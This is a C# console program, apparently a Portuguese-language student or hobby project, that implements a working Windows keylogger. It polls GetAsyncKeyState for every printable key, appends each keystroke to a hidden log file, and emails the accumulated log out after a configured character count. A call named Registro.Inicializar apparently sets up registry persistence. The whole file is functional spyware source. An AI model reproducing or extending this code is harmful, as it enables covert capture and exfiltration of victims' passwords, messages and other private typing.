using Microsoft.Win32;
using ProjetoKeyloggerConsole.Entities;
using System;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace ProjetoKeyloggerConsole; 

class Program
{ 
    //Importar a dll USER32 do Windows
    [DllImport("user32.dll")] private static extern int GetAsyncKeyState(int i);

    private static long Contador;
    
    static void Main(string[] args)
    {
        try
        {
            Registro.Inicializar(); 
            Config.Configuracoes();
        }
        catch (FileLoadException) 
        {
            Environment.Exit(1); 
        }
        string localpasta = Config.Pasta;
        //Verificar se existe a pasta da aplicação, caso não exista é criada a pasta
        if (!Directory.Exists(localpasta))
        {
            Directory.CreateDirectory(localpasta);
        }
        string localarquivo = localpasta + Config.Arquivo;
        //Verificar se existe o arquivo responsável por registrar a entrada de dados
        if(!File.Exists(localarquivo))
        {
            using(StreamWriter sw = File.CreateText(localarquivo)) { }
        }

        //Escrever no arquivo a data em que o arquivo foi aberto
        using(StreamWriter sw = File.AppendText(localarquivo))
        {
            sw.WriteLine("\n" + DateTime.Now.ToString("dd/MM/yyyy") + ":"); 
        }

        //Capturar a teclas digitadas
        while (true)
        {
            //Intervalo de pausa para que outro programa possa ser executado
            Thread.Sleep(5);
            //Loop para verificar as teclas do teclado
            for (int i = 32; i < 127; i++)
            {
                //Verificar qual tecla está sendo digitada
                int Status = GetAsyncKeyState(i);
                if(Status == 32769)
                {
                    //Salvar a teclas digitadas em um arquivo de texto
                    using (StreamWriter sw = File.AppendText(localarquivo))
                    {
                        sw.Write((char)i);
                        Contador++; 
                    }
                    //Enviar um email com o conteúdo do arquivo a cada tantas palavras digitadas
                    if (Contador % Config.QntChar == 0)
                    {
                        using (StreamReader sr = new StreamReader(localarquivo))
                        {
                            Email.EnviarEmail(sr.ReadToEnd());
                        }
                    }
                }
            }
        }
    }
}